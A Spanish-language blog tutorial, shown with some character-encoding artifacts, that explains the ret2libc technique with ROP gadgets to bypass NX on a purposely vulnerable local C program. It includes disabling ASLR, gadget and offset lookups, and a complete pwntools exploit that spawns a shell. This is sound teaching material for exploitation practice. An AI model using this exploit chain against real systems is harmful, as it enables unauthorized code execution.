I"¶U<p>En este articulo veremos como realizar un ataque con una tecnica llamada ret2libc para hacer bypass del NX haciendo uso de ROP</p>

<h2 id="que-es-ret2libc">Â¿Que es ret2libc?</h2>

<p>Es una tecnica para ejecutar codigo en la memoria apuntando a funciones de la libreria libc, por ejemplo, cuando se hace un programa en C con las funciones system, printf, put, esas funciones se compilan en un archivo de la libreria libc, entonces tenemos que apuntar a funciones de esa libreria</p>

<h3 id="por-que-usamos-ret2libc">Â¿Por que usamos ret2libc?</h3>

<p>Esta tecnica la usamos cuando con el RIP o EIP no podemos a apuntar a una direccion arbitraria para ejecutar una shellcode, esto occurre ya que tiene el NX activado.</p>

<p>Como vemos al parecer esta tecnica es similar a un bof stack-based comun, pero en vez de cambiar el RIP por una direccion que apunte a nuestra shellcode, lo que estamos haciendo es que apunte a direcciones de la libreria libc, mas adelante explicare nuestro payload y el por que.</p>

<h2 id="no-executable-nx">No Executable (NX)</h2>

<p>El NX o No executable, lo que hace es marcar el stack como no ejecutable, es decir que ahora en el stack nuestras entradas no se pueden ejecutar como codigo osea una shellcode, entonces si tomamos el control del RIP no vamos a poder redirigir el flujo del programa al RSP.</p>

<h2 id="un-poco-de-return-oriented-programming-rop">Un poco de Return Oriented Programming (ROP)</h2>

<h3 id="que-es-rop">Â¿Que es ROP?</h3>

<p>Es una tecnica usada para utilizar pequeÃ±as secuencias de intrucciones llamados gadgets con el fin de ejecutar operaciones arbitrarias, esto funciona ya que obtenermos el control de call stack para secuestrar el flujo del programa y luego ejecutar los gadgets</p>

<h3 id="gadgets">Gadgets</h3>

<p>Son las secuencias de instrucciones que terminan con la intruccion ret, el gadget que vamos a usar es este: <code class="language-plaintext highlighter-rouge">pop rdi; ret</code></p>

<h2 id="analizando-el-binario">Analizando el binario</h2>

<p><strong>Compilacion:</strong> <code class="language-plaintext highlighter-rouge">gcc -no-pie -fno-stack-protector ret2libc.c -o ret2libc</code></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
</span>
<span class="kt">void</span> <span class="nf">vuln</span><span class="p">();</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Input: "</span><span class="p">);</span>
        <span class="n">vuln</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(){</span>
        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
        <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Como vemos nuestro binario solo tiene la funcion <code class="language-plaintext highlighter-rouge">main</code> que esta imprimiendo un input y llamando a la funcion <code class="language-plaintext highlighter-rouge">vuln</code> y en esa funcion tenemos un buffer de 64 declarado como <code class="language-plaintext highlighter-rouge">char buffer[64];</code> y para obtener los datos del input se esta usando la funcion <code class="language-plaintext highlighter-rouge">gets</code> y los guarda en el <code class="language-plaintext highlighter-rouge">buffer</code>,  es bastante explicita la parte que es vulnerable del programa pero aun asi la explicare</p>

<p>El programa es vulnerable por que se esta usando la funcion <code class="language-plaintext highlighter-rouge">gets</code>y esto es por que esa funcion no le importa cuantos datos le mandemos aun asi los guardara, es decir que si tenemos un buffer de 64 y a travez de la funcion gets le mandamos 100, esos 100 aun asi los guardara, de hecho podemos ver la manpage de gets con este comando <code class="language-plaintext highlighter-rouge">man 3 gets</code> y bajando a la seccion de bugs nos dice algo como esto:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BUGS
       Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets()  will  read,  and
       because  gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use.  It has been used to
       break computer security.  Use fgets() instead.

       For more information, see CWE-242 (aka "Use of Inherently Dangerous Function") at http://cwe.mitre.org/data/definitions/242.html
</code></pre></div></div>

<p>Ahora con el comando <code class="language-plaintext highlighter-rouge">checksec</code> vamos a ver las protecciones del binario y nos debe de salir algo asi</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] '/home/omarh/Documentos/ExplotacionBinaria/ret2libC/ret2libc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre></div></div>

<p>Como vemos tiene la proteccion NX activada, asi que no podemos ejecutar codigo en el stack.</p>

<h2 id="explicando-el-payload-que-usaremos">Explicando el payload que usaremos</h2>

<p>Nuestro payload es el siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|------|-----|--------------|---------|----------|
| junk | ret | pop rdi; ret | /bin/sh | system() |
|------|-----|--------------|---------|----------|
</code></pre></div></div>

<ul>
  <li>Junk: esto es para llenar el buffer de 64 que tenemos</li>
  <li>ret: Direccion de ret, en otros casos esto no es necesario sin embargo esta vez lo usaremos por cuestiones de stack alignment</li>
  <li>pop rdi; ret, ok esto es nuestro gadget y lo usaremos ya que esto nos va a servir para meter cualquier cosa al registro <code class="language-plaintext highlighter-rouge">RDI</code> y tomando en cuenta las calling conventions el registro <code class="language-plaintext highlighter-rouge">RDI</code> es el primero que se manda como argumento, lo que meteremos a <code class="language-plaintext highlighter-rouge">rdi</code> es la direccion de <code class="language-plaintext highlighter-rouge">/bin/sh</code> que tambien va a ser lo que le pasaremos a <code class="language-plaintext highlighter-rouge">system</code> para que ejecute</li>
</ul>

<p>Explicare mas a detalle como funciona lo de <code class="language-plaintext highlighter-rouge">pop rdi; ret</code>, imaginemos que queremos usar <code class="language-plaintext highlighter-rouge">pop rdi; ret</code> para ingresar a <code class="language-plaintext highlighter-rouge">rdi</code> el valor de <code class="language-plaintext highlighter-rouge">0x10</code> y luego saltar a una funcion llamada <code class="language-plaintext highlighter-rouge">funcion1</code></p>

<p><strong>A tomar en cuenta:</strong>
Cuando se sobreescribe el <code class="language-plaintext highlighter-rouge">RET</code> tambien se sobreescribe el valor al que apunta <code class="language-plaintext highlighter-rouge">RSP</code></p>

<p>Entonces ahora si empezamos, tenemos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|--------------|
|     junk     |
|--------------|
| pop rdi; ret | --&gt; Direccion de pop rdi; ret
|--------------|
|     0x10     | --&gt; El valor que meteremos a rdi
|--------------|
|   funcion1   |
|--------------|
</code></pre></div></div>
<p>Ahora sobreescribimos el <code class="language-plaintext highlighter-rouge">RIP</code> por la direccion de <code class="language-plaintext highlighter-rouge">ret</code>, entonces <code class="language-plaintext highlighter-rouge">RSP</code> se mueve a la direccion de <code class="language-plaintext highlighter-rouge">pop rdi; ret</code>, lo que pasaria seria algo com esto <code class="language-plaintext highlighter-rouge">ret rip rsp</code> y nuestro layout queda asi:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|--------------|                            gadget
|     junk     |                         |---------|  
|--------------|                         |   ret   |  &lt;---- RIP
| pop rdi; ret | --&gt; RSP apunta aca      |---------|
|--------------|
|     0x10     |
|--------------|
|   funcion1   |
|--------------|
</code></pre></div></div>

<p>Ahora <code class="language-plaintext highlighter-rouge">RSP</code> apuntara a <code class="language-plaintext highlighter-rouge">0x10</code> y nuestro <code class="language-plaintext highlighter-rouge">RIP</code> ahora apunta a <code class="language-plaintext highlighter-rouge">POP RDI</code>, entonces ahora si <code class="language-plaintext highlighter-rouge">0x10</code> se movera a <code class="language-plaintext highlighter-rouge">rdi</code>, el layot queda asi:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|--------------|                              Gadget
|     junk     |                            |---------|
|--------------|                    RIP --&gt; | pop rdi |
| pop rdi; ret |                            |---------|
|--------------|                            |   ret   |
|     0x10     | --&gt; RSP apunta aca         |---------|
|--------------|
|   funcion1   |
|--------------|
</code></pre></div></div>

<p>Y bueno ahora <code class="language-plaintext highlighter-rouge">RSP</code> pasara  los siguientes elementos del stack ejecutando la funcion <code class="language-plaintext highlighter-rouge">funcion1</code> y el layout queda asi</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|--------------|
|     junk     |
|--------------|
| pop rdi; ret | 
|--------------|
|     0x10     |
|--------------|
|   funcion1   | --&gt; RSP apunta aca
|--------------|
</code></pre></div></div>

<p>Dejemos este ejemplo de lado y ahora pasaremos a ver como queda el layout tomando en cuenta nuestro payload</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  layout normal        layout modificado
|---------------|      |--------------| 
|    funcion    | --&gt;  |    system()  | --&gt; direccion de system
|---------------|      |--------------|
|   parametros  | --&gt;  |    /bin/sh   | --&gt; direccion de /bin/sh
|---------------|      |--------------|
|      RET      | --&gt;  | pop rdi; ret | --&gt; direccion de pop rdi; ret
|---------------|      |--------------|
|      RBP      | --&gt;  |      ret     | --&gt; direccion de ret
|---------------|      |--------------|
|     buffer    | --&gt;  |     junk     | --&gt; caracteres para llenar el buffer
|---------------|      |--------------|
|               |      |              |
|---------------|      |--------------|

</code></pre></div></div>
<p>Y ahora si que ya se explico esto ya podemos empezar a sacar todo lo que necesitamos</p>

<h2 id="desbordando-el-buffer-y-calculando-el-offset-del-rip">Desbordando el buffer y calculando el offset del RIP</h2>

<p><strong>Ya no profundizare mucho en esto ya que esta el post de BoF stack-based donde si lo hago</strong></p>

<p>Para esta practica desactivaremos el ASRL con este comando:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 
</code></pre></div></div>
<p>Comenzaremos a debuggear el programa con el comando <code class="language-plaintext highlighter-rouge">gdb -q ./ret2libc</code> , en mi caso usare gdb con gef, te dejo el link del repo de gef por si lo quieres instalar</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/hugsy/gef.git
</code></pre></div></div>
<p>Gef tiene un comando que se llama <code class="language-plaintext highlighter-rouge">pattern create</code> para generar una serie de caracteres que nos ayudaran a calcular los offsets, asi que le pasaremos ese comando de esta manera <code class="language-plaintext highlighter-rouge">pattern create 100</code> y nos generara 100 caracteres, ahora ejecutaremos el binario pasandole esos 100 caracteres como input, como podemos ver nuestro RSP ahora vale:</p>

<p><code class="language-plaintext highlighter-rouge">*RSP  0x7fffffffda68 ââ 'jaaaaaaakaaaaaaalaaaaaaamaaa'</code></p>

<p>Ahora usaremos otro comando que tiene gef que se llama <code class="language-plaintext highlighter-rouge">patter offset</code> para calcular el offset del RSP, ingresamos lo siguiente</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>patter offset jaaaaaaa
</code></pre></div></div>
<p>Esto nos debe de dar algo como esto</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Searching for 'jaaaaaaa'
[+] Found at offset 72 (little-endian search) likely
[+] Found at offset 65 (big-endian search) 
</code></pre></div></div>
<p>Vemos como el desplazamiento para llegar al RIP es 72. Para esta practica usaremos el offset 72 que corresponde a little-endian</p>

<h2 id="consiguiendo-la-direccion-de-libc">Consiguiendo la direccion de libc</h2>

<p>Ahora pasaremos a conseguir la direccion de libc ya que esto nos ayudara a conseguir la direccion real de los offsets de ret, pop rdi; ret, /bin/sh y system()</p>

<p>Para eso podemos usar el comando <code class="language-plaintext highlighter-rouge">info proc mappings</code> el cual nos mostrara todas las regiones de la memoria mapeadas</p>

<p><img src="/assets/img/ret2libc/libc.png" alt="" /></p>

<p>Vemos como la direccion que tengo seleccionada es la direccion del comienzo de la libreria libc y esa es la que usaremos.</p>

<h3 id="usando-el-comando-ldd">Usando el comando ldd</h3>

<p>Tambien podemos sacar la direccion de libc usando el comando ldd pasandole como argumento nuestro binario, asi que el comando queda asi <code class="language-plaintext highlighter-rouge">ldd ret2libc</code>, esto nos da como resultado lo siguiente</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	linux-vdso.so.1 (0x00007ffff7fc4000)
	libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007ffff7c00000) --&gt; Esta es la direccion de libc
	/lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fc6000)
</code></pre></div></div>
<p>La direccion que corresponde a libc la indique con una flecha, y esa direccion es la misma que la que sacamos con el comando <code class="language-plaintext highlighter-rouge">info proc mappings</code> simplemente con unos 0 demas (podemos usar la que sea de las 2).</p>

<h2 id="consiguiendo-los-offset-de-ret-pop-rdi-ret-binsh-y-system">Consiguiendo los offset de RET, POP RDI RET, /bin/sh y system()</h2>

<p>Ahora viene la parte de sacar los offsets de RET, POP RDI RET, /bin/sh y system()</p>

<h3 id="offset-de-ret">Offset de RET</h3>

<p>Para sacar el offset de ret usare una herramienta llamada <code class="language-plaintext highlighter-rouge">Ropper</code>, les dejo el gitub de su repo para que la instalen <code class="language-plaintext highlighter-rouge">https://github.com/sashs/Ropper.git</code></p>

<p>Pondremos este comando para conseguir el offset de <code class="language-plaintext highlighter-rouge">ret</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ropper --file /usr/lib/libc.so.6 --search "ret"
</code></pre></div></div>
<p>Tenemos que indicar la ruta de la libreria libc la cual la podemos ver tambien cuando ingresamos el comando <code class="language-plaintext highlighter-rouge">ldd ret2libc</code> y depues usamos <code class="language-plaintext highlighter-rouge">--search</code> para buscar <code class="language-plaintext highlighter-rouge">ret</code> y si ejecutamos nos sale algo como esto:</p>

<p><img src="/assets/img/ret2libc/ret.png" alt="" /></p>

<p>Debemos de selecionar el offset en el cual solo tenga la cadena <code class="language-plaintext highlighter-rouge">ret:</code>, en mi caso yo seleccione esa que esta seleccionada en la imagen, entonces el offset es esto</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x0000000000102ea4
</code></pre></div></div>
<h3 id="offset-de-pop-rdi-ret">Offset de pop rdi; ret</h3>

<p>Para sacar el offset de pop rdi; ret usamos el mismo comando solo que al final en lo que queremos buscar le cambiamos a <code class="language-plaintext highlighter-rouge">pop rdi</code> y queda asi</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ropper --file /usr/lib/libc.so.6 --search "pop rdi"
</code></pre></div></div>
<p>Esto nos imprime lo siguiente</p>

<p><img src="/assets/img/ret2libc/poprdi.png" alt="" /></p>

<p>Y de nuevo, seleccionare el que muestro ahi en pantalla, asi que el offset es:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x0000000000029835
</code></pre></div></div>

<h3 id="offset-de-binsh">Offset de /bin/sh</h3>

<p>Para sacar el offset de /bin/sh usaremos el comando strings para buscar en el archivo de libc la cadena <code class="language-plaintext highlighter-rouge">/bin/sh</code> , el comando queda asi</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings -a -t x /usr/lib/libc.so.6 | grep "/bin/sh"
</code></pre></div></div>
<p>Esto nos da como resultado: <code class="language-plaintext highlighter-rouge">1bb26a /bin/sh</code></p>

<h3 id="offset-de-system">Offset de system()</h3>

<p>Usare el comando <code class="language-plaintext highlighter-rouge">readelf</code> para buscar por <code class="language-plaintext highlighter-rouge">system</code> en el archivo de la libreria libc y el comando queda asi:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>readelf -s libc.so.6 | grep system
</code></pre></div></div>
<p>Esto nos imprime:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1481: 000000000004ba40    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
</code></pre></div></div>
<p>Donde el offset es: <code class="language-plaintext highlighter-rouge">000000000004ba40</code></p>

<h2 id="creando-nuestro-exploit-y-ejecutandolo">Creando nuestro exploit y ejecutandolo</h2>

<p>Ya que tenemos todos los offset solo tenemos que armar todo y el exploit queda asi</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./ret2libc"</span><span class="p">)</span> 

<span class="n">libc</span> <span class="o">=</span> <span class="mh">0x7ffff7c00000</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x0000000000029835</span>
<span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x1bb26a</span>
<span class="n">system</span> <span class="o">=</span> <span class="mh">0x000000000004ba40</span>
<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x0000000000102ea4</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">72</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">ret</span><span class="p">)</span> 
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">pop_rdi</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">bin_sh</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">system</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Se pueden dar cuenta que se esta sumando la direccion de libc con los offsets de pop rdi, bin/sh, system, y ret, esto es para que nos saque la direccion real, tambien usamos âp64â para transformar esas direcciones a little endian de 64 bits, ahora ejecutamos y vemos como obtuvimos una shell</p>

<p><img src="/assets/img/ret2libc/pwn.png" alt="" /></p>

<p>Eso ha sido todo, gracias por leer â¤</p>
:ET